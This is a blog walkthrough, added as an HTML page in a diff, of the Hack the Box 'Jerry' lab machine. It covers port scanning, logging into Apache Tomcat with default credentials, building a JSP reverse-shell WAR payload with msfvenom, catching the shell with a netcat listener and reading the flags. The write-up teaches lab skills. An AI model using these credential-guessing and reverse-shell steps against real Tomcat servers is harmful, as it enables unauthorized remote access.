@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Jerry Machine Walkthrough - s0merset7&#39;s Blog</title>
+<meta name="description" content="Step-by-step walkthrough of the Hack the Box Jerry Machine.">
+
+<meta name="author" content="s0merset7"><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "s0merset7\u0027s Blog",
+    
+    "url": "https:\/\/s0merset7.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/s0merset7.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/s0merset7.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/s0merset7.github.io\/post\/2020\/aug\/jerry_machine\/",
+          "name": "Jerry machine walkthrough"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "s0merset7"
+  },
+  "headline": "Jerry Machine Walkthrough",
+  "description" : "Step-by-step walkthrough of the Hack the Box Jerry Machine.",
+  "inLanguage" : "en",
+  "wordCount":  1644 ,
+  "datePublished" : "2020-08-24T00:00:00",
+  "dateModified" : "2020-08-24T00:00:00",
+  "image" : "https:\/\/s0merset7.github.io\/",
+  "keywords" : [ "HacktheBox, Walkthrough" ],
+  "mainEntityOfPage" : "https:\/\/s0merset7.github.io\/post\/2020\/aug\/jerry_machine\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/s0merset7.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/s0merset7.github.io\/",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:image" content="https://s0merset7.github.io/posts/Jerry_Machine.png">
+<meta property="og:url" content="https://s0merset7.github.io/post/2020/aug/jerry_machine/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="s0merset7&#39;s Blog">
+   
+<link rel="apple-touch-icon" sizes="180x180" href=" https://s0merset7.github.io/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://s0merset7.github.io/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://s0merset7.github.io/favicon/favicon-16x16.png">
+
+
+<meta name="generator" content="Hugo 0.111.3"><link rel="alternate" href="https://s0merset7.github.io/index.xml" type="application/rss+xml" title="s0merset7&#39;s Blog">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+<link rel="stylesheet" href="https://s0merset7.github.io/css/main.css">
+<link disabled id="dark-mode-theme" rel="stylesheet" href="https://s0merset7.github.io/css/dark.css">
+<link rel="stylesheet" href="https://s0merset7.github.io/css/highlight.min.css"><link rel="stylesheet" href="https://s0merset7.github.io/css/codeblock.css">
+
+
+
+
+  </head>
+  <body>
+    
+<div class="container fixed-top">
+  <div class="row justify-content-center">
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+
+      <nav class="navbar navbar-expand-lg navbar-light fixed-top p-0">
+        <div class="container">
+          
+          <a class="navbar-brand fw-bold" href="https://s0merset7.github.io/">s0merset7&#39;s Blog</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+
+          <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+            <ul class="navbar-nav mb-2 mb-lg-0">
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Home"
+                  href="/"> Home</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Tags"
+                  href="/tags/"> Tags</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="About"
+                  href="/about/"> About</a>
+              </li>
+
+              
+              
+
+              
+              <li class="nav-item nav-link">
+                <a id="dark-mode-toggle" class="bi bi-sun"></a>
+              </li>
+              
+            </ul>
+          </div>
+        </div>
+      </nav>
+
+    </div>
+  </div>
+</div>
+    
+
+
+
+
+
+
+
+
+
+<header class="header-section ">
+
+  <div class="intro-header no-img mt-10">
+    <div class="container">
+      <div class="row justify-content-center">
+        
+        <div class="col-sm-12 col-md-12 col-lg-8 col-xl-8">
+          
+
+          
+          <div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+            
+
+            <div class="post-heading">
+              
+
+              
+
+              
+              <h1 class="fw-semibold display-5 lh-1 mb-3"> 
+                Jerry Machine Walkthrough
+                
+              </h1>
+              
+              
+
+              
+
+              
+              
+              <span class="post-meta">
+  
+  
+  &nbsp;August 24, 2020 
+
+  
+
+  
+  
+  
+</span>
+
+
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 ">
+
+      <div class="card-image card-image-blog p-0">
+        
+        <img src="/posts/Jerry_Machine.png" alt="Jerry Machine Walkthrough" class="card-img-bottom img-fluid">
+        
+        
+      </div>
+    </div>
+ 
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+      <article role="main" class="blog-post">
+        <ol>
+<li>In a new terminal window, run <code>nmap -sC -sV 10.10.10.95</code>
+<ul>
+<li><code>-sC</code>: Adds on the &ldquo;default&rdquo; scripts to be run which include things like &ldquo;Speed&rdquo;, &ldquo;usefulness&rdquo;, and &ldquo;Intrusiveness&rdquo;. You can check them out in more detail by looking under <em>&ldquo;default&rdquo;</em> in the <strong>Script Categories</strong> section on <a href="https://nmap.org/book/nse-usage.html">this website</a></li>
+<li><code>-sV</code>: Probe open ports to determine service/version info</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194000-0d2d2600-dd7b-11ea-95bb-7876faf2f160.png" alt="image"></p>
+<ol start="2">
+<li>It looks like we only have one open port (8080) and it&rsquo;s running a service called <strong>Apache Tomcat/Coyote JSP engine 1.1</strong></li>
+<li>If we do a little research we find out a few things:
+<ul>
+<li><strong>Apache Tomcat</strong> is <a href="https://en.wikipedia.org/wiki/Apache_Tomcat">a &ldquo;pure Java&rdquo; HTTP web server environment in which Java code can run</a></li>
+<li><strong>Coyote</strong> <a href="https://en.wikipedia.org/wiki/Apache_Tomcat#Coyote">is a Connector component for Tomcat that supports the HTTP 1.1 protocol as a web server</a></li>
+</ul>
+</li>
+<li>Being that <strong>Apache Tomcat</strong> (or <strong>Tomcat</strong> for short) provides a web-server environment, we can actually go to the website and see it.</li>
+<li>Let&rsquo;s check it out by going to <em>http://10.10.10.95:8080</em>
+<ul>
+<li>This URL works because we know from the portscan that <strong>Tomcat</strong> is an http service, so we add the <em>&ldquo;http://&rdquo;</em> at the beginning followed by the HTB IP address, and then the <em>&quot;:8080&quot;</em> allows us to specify the port number. All of this works together to say we want to go to the IP address <em>10.10.10.95</em> via an <em>http</em> connection at port <em>8080</em></li>
+</ul>
+</li>
+<li>Once we get there we can see a few things:</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194129-6301ce00-dd7b-11ea-9ced-6de716eaae9f.png" alt="image"></p>
+<ol start="7">
+<li>If we explore around, most of the clickable options redirect us to help pages for how to use <strong>Tomcat</strong>, with the exception of the <em>Server Status</em>, <em>Manager App</em>, and <em>Host Manager</em>. If we click on any of those three we get this pop-up:</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194521-5d58b800-dd7c-11ea-83e6-e5d31cadc18c.png" alt=""></p>
+<ol start="8">
+<li>So it&rsquo;s asking us for credentials that we don&rsquo;t know. Before trying to set up any complicated password breaking attacks, I find it a good idea to try at least a few of the basics. Some of these include <em>admin:admin</em>, <em>admin:password</em>, <em>admin:pass</em>, etc, (where <em>admin</em> stands for <em>administrator</em> in the hopes that with these credentials we can log into the account with the most privileges)</li>
+<li>If we try <em>admin:admin</em> on the <em>Server Status</em> feature it works! And we end up looking at a page like this:</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194585-7e210d80-dd7c-11ea-841d-bdb63ee97243.png" alt=""></p>
+<ol start="10">
+<li>This page has a bunch of information about <strong>Tomcat</strong> and this particular server it&rsquo;s running on. Unfortunately, aside from telling us a little bit more about the server, it doesn&rsquo;t help us get any closer finding a vulnerability</li>
+<li>Lets go back and try a different option to see if we can find something more useful. If we go back to the main page and click on <em>Manager App</em> however, we get this 403 error message (you may have also gotten a similar 401 error message earlier if you had clicked <em>Cancel</em> or exited out of the username password prompt):
+<ul>
+<li>The 401 error is a result of the website thinking we are attempting to access a page without giving credentials when we exit out of the login pop-up, and the 403 error is when we are logged in with credentials, but then try and access a page that we don&rsquo;t have privileges to</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194659-985aeb80-dd7c-11ea-9e8a-7baee5498d7c.png" alt=""></p>
+<ol start="12">
+<li>This error message is very interesting though, if we read it, we find that it gives us instructions on how to set up a manager account, with example credentials <em>tomcat:s3cret</em>. Now what often happens is that people will follow these instructions exactly (same way you might go about changing a password for a website), however, if the service doesn&rsquo;t check for (or the user doesn&rsquo;t remember to change) the example credentials, then we may be able to use them to sign into our administrator account</li>
+<li>To be able to try this new idea though, we first need to be able to get our pop-up back to retry our credentials, and as you probably noticed, <strong>Tomcat</strong> will only show us error messages instead. To fix this, we need to go to <em>Preferences</em> -&gt; <em>Privacy &amp; Security</em> -&gt; <em>History</em> and clear our history (there should be options as to how far back you want to erase your history if you don&rsquo;t want to delete everything):</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194719-bd4f5e80-dd7c-11ea-8481-5a6832331cfd.png" alt=""></p>
+<ul>
+<li>The reason this works, is because every time we attempt to log in, the website takes our credentials, encodes them, and puts them in what&rsquo;s called a &ldquo;header&rdquo;. This header is read by the website and if it matches the proper credentials, then it will allow us to access the content. If it doesn&rsquo;t match, then the website will react with an error message. Most browsers save our most recent credentials or headers on websites, so by clearing our history, we can clear them which allows us to try again.</li>
+</ul>
+<ol start="14">
+<li>Once we&rsquo;ve done that, we can go back, click on <em>Manager App</em> and our pop-up is back!</li>
+<li>If we try <em>tomcat:s3cret</em> it works and we get this page:</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194758-d35d1f00-dd7c-11ea-808c-aef11f8837b5.png" alt=""></p>
+<ol start="16">
+<li>If we explore around a little we&rsquo;ll find a section called <em>&ldquo;WAR file to deploy&rdquo;</em>, and this is what we&rsquo;re going to want to look at, because chances are if we have the ability to upload something, we can make that something do what we want</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194805-ecfe6680-dd7c-11ea-8743-f0b840a6c14c.png" alt=""></p>
+<ul>
+<li>So what even is a WAR file?
+<ul>
+<li>A WAR (Web Application Resource) file is like a ZIP file in the sense that it is actually a collection of other files compressed together. However unlike ZIP files, WAR files are comprised solely of <a href="https://en.wikipedia.org/wiki/JAR_(file_format)">JAR</a> files meant to hold resources to create a website</li>
+</ul>
+</li>
+</ul>
+<ol start="17">
+<li>Now before we start trying to write our own WAR file, lets check if we have any tools that might have something already written</li>
+<li>One way we can check is by using a program called <strong>MsfVenom</strong>, a payload generator for <strong>Metasploit</strong></li>
+<li>Since we know WAR files are a collection of JSP/Java files, lets see what payload options  <strong>MsfVenom</strong> has with <code>msfvenom -l payloads | grep java</code>
+<ul>
+<li>The <code>msfvenom -l payloads</code> will list all of the payloads <strong>MsfVenom</strong> can produce, but since there are so many we&rsquo;ll want to reduce our results by pipelining the results through <code>grep java</code> which filters all the results and shows us only the ones with the word &ldquo;java&rdquo; in it</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90194897-1ae3ab00-dd7d-11ea-8596-af7405e332d4.png" alt=""></p>
+<ol start="20">
+<li>Taking a look at these results, we can narrow it down by figuring out what else we want, JSP (because it&rsquo;s a WAR file), a reverse shell (check out the first bit of <a href="https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9">this article</a> to understand why), and a tcp connection (as we determined from our portscan). This leaves us with the <em>&ldquo;java/jsp_shell_reverse_tcp&rdquo;</em> option</li>
+<li>To create our WAR file to upload to <strong>Tomcat</strong>, we&rsquo;ll run <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=yourHtbIp LPORT=openPort -f war &gt; aName.war</code>. Now that&rsquo;s a big command with a lot of fill-in-the-blanks so let&rsquo;s break it down:
+<ul>
+<li><code>msfvenom</code>: We are using <strong>MsfVenom</strong> to create our program and this calls it</li>
+<li><code>-p java/jsp_shell_reverse_tcp</code>: This indicates that we want to create a <!-- raw HTML omitted --><strong>p</strong><!-- raw HTML omitted -->ayload in <em>java</em> that will create a <em>JSP Reverse Shell</em> using a <em>TCP</em> connection</li>
+<li><code>LHOST=yourHtbIp</code>: Setting the local host by replacing &ldquo;yourHtbIp&rdquo; with your Hack the Box IP (can be found in the <strong>Access</strong> tab when signed into your HTB account)</li>
+<li><code>LPORT=openPort</code>: Setting the port to be used for the reverse shell connection</li>
+<li><code>-f war</code>: Setting the <!-- raw HTML omitted --><strong>f</strong><!-- raw HTML omitted -->ormat of the payload to be a WAR file</li>
+<li><code>&gt; aName.war</code>: Replace &ldquo;aName&rdquo; with whatever you want to name your payload file</li>
+</ul>
+</li>
+<li>You&rsquo;ll want to run your version of the command, and after a few moments you&rsquo;ll get a message saying the size of the file, and if we type <code>ls</code> we can see our file!</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195123-8d548b00-dd7d-11ea-8e9f-ab9c211396e3.png" alt=""></p>
+<ol start="23">
+<li>So let&rsquo;s go ahead and upload our WAR file to <strong>Tomcat</strong> by clicking <em>&ldquo;Browse&rdquo;</em> in the <em>&ldquo;WAR file to deploy&rdquo;</em> section, and once we see our file in there, click <em>&ldquo;Deploy&rdquo;</em></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195193-ad844a00-dd7d-11ea-8818-d64676277795.png" alt=""></p>
+<ol start="24">
+<li>If you did it right, you should see your file sorted in alphabetically with the other preexisting files:</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195220-bbd26600-dd7d-11ea-9d35-9c0a13684bc1.png" alt=""></p>
+<ol start="25">
+<li>Before we do anything with it though, since we learned a Reverse Shell relies on a &ldquo;listener&rdquo; running on our device for our victim to connect to with a shell, we need to set up a listener with <code>nc -lvnp yourLPORT</code>
+<ul>
+<li><code>-lvnp</code> is short for <code>-l -v -n -p</code> and specifies four things:
+<ul>
+<li><code>-l</code>: Listen for incoming traffic</li>
+<li><code>-v</code>: Be verbose (give details of what is going on in the process)</li>
+<li><code>-n</code>: No DNS lookups are required (it saves time and makes the command simpler)</li>
+<li><code>-p</code>: Specifies a specific port to be listening on (which is why you need to put an open port after to be listening on)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Once we do that, we should get this response showing that our &ldquo;listener&rdquo; is ready</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195262-d86e9e00-dd7d-11ea-8a05-c4e79114cbe1.png" alt=""></p>
+<ol start="27">
+<li>Let&rsquo;s go ahead and activate our WAR file by clicking on it in <strong>Tomcat</strong>, and if we check our listener, we have a shell!</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195317-f50ad600-dd7d-11ea-89fa-bb44e930cd29.png" alt=""></p>
+<ol start="28">
+<li>Since we&rsquo;re in a new shell, we&rsquo;ll want to check out the <em>help</em> page to see what the commands are by running <code>help</code></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195340-0522b580-dd7e-11ea-935d-8235bb2c27dc.png" alt=""></p>
+<ol start="29">
+<li>We can see all of the commands and what they do in this shell, the main ones that concern us will be that the command <code>dir</code> replaces <code>ls</code> and <code>cat</code> is replaced with <code>type</code></li>
+<li>If we navigate around using these commands, we&rsquo;ll find a file in <em>Users/Administrator/Desktop/flags</em> called <em>&ldquo;2 for the price of 1.txt&rdquo;</em></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/90195404-25eb0b00-dd7e-11ea-9184-ac1fbf931ffc.png" alt=""></p>
+<ol start="31">
+<li>If we run <code>type &quot;2 for the price of 1.txt&quot;</code>, then we can see our user and root hashes and enter them to get our points!</li>
+</ol>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/144">Official Jerry Writeup from Hack the Box</a></li>
+<li><a href="https://youtu.be/PJeBIey8gc4">Jerry Video Tutorial from IppSec</a></li>
+<li><a href="https://0xrick.github.io/hack-the-box/jerry/">Jerry Write-Up by 0xRick</a></li>
+<li><a href="https://nmap.org/book/man-briefoptions.html"><code>nmap</code> Command Help</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Apache_Tomcat">Information on Apache Tomcat</a></li>
+<li><a href="https://www.varonis.com/blog/netcat-commands/">Information on NetCat Commands</a></li>
+<li><a href="https://en.wikipedia.org/wiki/WAR_(file_format)">Information on WAR files</a></li>
+</ul>
+<h6 id="font-size178-97-39-77-104-111-105-39-67-104-98-32-116-39-111-98-102-99-39-116-119-107-110-115-116-39-104-119-98-105-39-102-105-99-39-102-39-82-65-72-39-116-111-104-114-107-99-39-97-107-126-39-104-114-115-43-39-78-39-112-102-105-115-39-126-104-114-39-115-104-39-111-102-113-98-39-98-127-119-98-100-115-98-99-39-110-115font"><!-- raw HTML omitted -->78 97 39 77 104 111 105 39 67 104 98 32 116 39 111 98 102 99 39 116 119 107 110 115 116 39 104 119 98 105 39 102 105 99 39 102 39 82 65 72 39 116 111 104 114 107 99 39 97 107 126 39 104 114 115 43 39 78 39 112 102 105 115 39 126 104 114 39 115 104 39 111 102 113 98 39 98 127 119 98 100 115 98 99 39 110 115<!-- raw HTML omitted --></h6>
+
+      </article>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+      <hr />
+    </div>
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-2">
+        
+          <div class="blog-tags">
+            
+              <a href="https://s0merset7.github.io//tags/hackthebox/">HacktheBox</a>
+            
+              <a href="https://s0merset7.github.io//tags/walkthrough/">Walkthrough</a>
+            
+          </div>
+        
+      </div>
+ 
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+      
+      <section id="social-share">
+        <div class="list-inline footer-links">
+          
+
+<div class="share-box" aria-hidden="true">
+    <div>
+        <p class="list-inline footer-links">Please share using the links if you enjoyed!</p>
+    </div>
+    <ul class="share">
+
+        
+        <li>
+            <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2fjerry_machine%2f" target="_blank" title="Share on Facebook">
+                <i class="bi bi-facebook facebook-color"></i>
+            </a>
+        </li>
+
+        
+        <li>
+            <a href="//twitter.com/share?url=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2fjerry_machine%2f&amp;text=Jerry%20Machine%20Walkthrough&amp;via=map%5bgithub%3as0merset7%20linkedin%3aryan-dinnan%20name%3as0merset7%20twitter%3as0merset7%5d" target="_blank" title="Share on Twitter">
+                <i class="bi bi-twitter twitter-color"></i>
+            </a>
+        </li>
+
+        
+        <li>
+            <a href="//reddit.com/submit?url=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2fjerry_machine%2f&amp;title=Jerry%20Machine%20Walkthrough" target="_blank" title="Share on Reddit">
+                <i class="bi bi-reddit reddit-color"></i>
+            </a>
+        </li>
+
+        
+        <li>
+            <a href="whatsapp://send?text=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2fjerry_machine%2f&amp;description=Jerry%20Machine%20Walkthrough" target="_blank" rel="noopener" title="Share on WhatsApp">
+                <i class="bi bi-whatsapp whatsapp-color"></i>
+            </a>
+        </li>
+
+
+        
+
+        
+
+        
+
+        
+        
+
+    </ul>
+</div>
+
+
+        </div>
+      </section>
+      
+    </div>
+
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 mt-3">
+      <div class="card">
+        <div class="row no-gutters">
+          <div class="col-md-2 "> 
+            <div class="card-body ">
+            <img src="/img/profilePic.png" class="img-responsive img-50 img-round" alt="">
+          </div>
+          </div>
+          <div class="col-md-10">
+            <div class="card-body p-1.1">
+
+              <p class="p-0 m-0"><small class="text-muted ">Written By</small></p>
+              <h5>
+                
+                
+                s0merset7
+                
+                
+              </h5>
+              <p class="card-text fs-1"></p>
+            </div>
+          </div>
+        </div>
+
+      
+    </div>
+  </div>
+
+      <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+        
+        <ul class="list-group list-group-horizontal" style="flex-direction: row">
+          
+          <li class="list-group-item b-0">
+
+            <a type="button" class="btn btn-dark" role="button" href="https://s0merset7.github.io/post/2020/aug/lame_machine/"
+              data-toggle="tooltip" data-placement="top" title="Lame Machine Walkthrough">&larr;
+              Previous Post</a>
+          </li>
+          
+
+
+          
+          <li class="list-group-item ms-auto b-0">
+            <a type="button" class="btn btn-dark" role="button" href="https://s0merset7.github.io/post/2021/may/kali_setup/kali_setup/"
+              data-toggle="tooltip" data-placement="top" title="Kali Linux Setup and Customization">Next Post
+              &rarr;</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+
+      <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4"> 
+      </div>
+    </div>
+  </div>
+
+  <div class="">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-12 col-md-12 mt-3">
+          <h3>Read more</h3>
+          <hr />
+        </div>
+
+        
+        
+        
+        
+
+        
+ 
+        
+        
+         
+        <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6  mb-4">
+    <div class="card h-100 single-post-card shadow-effect bg-faded-light">
+        <a href="https://s0merset7.github.io/post/2020/aug/lame_machine/">
+            <div class="card-body">
+
+                <h3 class="fw-bold post-title">Lame Machine Walkthrough</h3>
+                
+
+                <p class="post-meta">
+                    <span class="post-meta">
+  
+  
+  &nbsp;August 24, 2020 
+
+  
+
+  
+  
+  
+</span>
+
+
+                </p>
+                
+                <div class="post-entry">
+
+                    
+                    Step-by-step walkthrough of the Hack the Box Lame Machine.
+
+                    
+                </div>
+
+                <div class="read-more-section">
+                    <h6>Read more</h6>
+                </div>
+            </div>
+
+            
+            <img src="/posts/Lame_Machine.png" alt="Lame Machine Walkthrough" class="card-img-top img-fluid">
+            
+            
+        </a>
+    </div>
+</div> 
+        
+         
+        <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6  mb-4">
+    <div class="card h-100 single-post-card shadow-effect bg-faded-light">
+        <a href="https://s0merset7.github.io/post/2020/aug/intro/">
+            <div class="card-body">
+
+                <h3 class="fw-bold post-title">Hack the Box Walkthroughs Intro</h3>
+                
+
+                <p class="post-meta">
+                    <span class="post-meta">
+  
+  
+  &nbsp;August 23, 2020 
+
+  
+
+  
+  
+  
+</span>
+
+
+                </p>
+                
+                <div class="post-entry">
+
+                    
+                    Introduction into the site and what&#39;s to come.
+
+                    
+                </div>
+
+                <div class="read-more-section">
+                    <h6>Read more</h6>
+                </div>
+            </div>
+
+            
+            <img src="/posts/intro.png" alt="Hack the Box Walkthroughs Intro" class="card-img-top img-fluid">
+            
+            
+        </a>
+    </div>
+</div> 
+         
+
+        
+        
+      </div>
+    </div>
+
+    
+
+  </div>
+</div>
+</div>
+
+    
+
+
+<footer>
+
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <ul
+          class="list-inline list-group list-group-horizontal text-center footer-links d-flex justify-content-center flex-row">
+
+          
+          <li>
+            <a href="https://github.com/s0merset7" title="GitHub" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-github"></i>
+              </span>
+            </a>
+          </li>
+          <li>
+            <a href="https://twitter.com/s0merset7" title="Twitter" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-twitter"></i>
+              </span>
+            </a>
+          </li>
+          <li>
+            <a href="https://linkedin.com/in/ryan-dinnan" title="LinkedIn" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-linkedin"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="col-md-12">
+        <p class="credits copyright text-muted">
+          
+          
+          s0merset7
+          
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+          2022
+          
+
+          
+          &nbsp;&bull;&nbsp;
+          <a href="https://s0merset7.github.io/">s0merset7&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          Powered by <a href="https://gohugo.io">Hugo</a> & <a href="https://github.com/binokochumolvarghese/lightbi-hugo">Lightbi.</a>&nbsp; Made with ❤ by <a href="https://binovarghese.com">Bino</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha256-tG5mcZUtJsZvyKAxYLVXrmjKBVLd6VpVccqz/r4ypFE=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.min.js" integrity="sha384-Y4oOpwW3duJdCWv5ly8SCFYWqFDsfob/3GkgExXKV4idmbt98QcxXYs9UoXAB7BZ" crossorigin="anonymous"></script>
+<script src="https://s0merset7.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function () { $("pre.chroma").css("padding", "0"); }); </script><script src="https://s0merset7.github.io/js/dark-mode.js"></script>
+    
+  </body>
+</html>
+
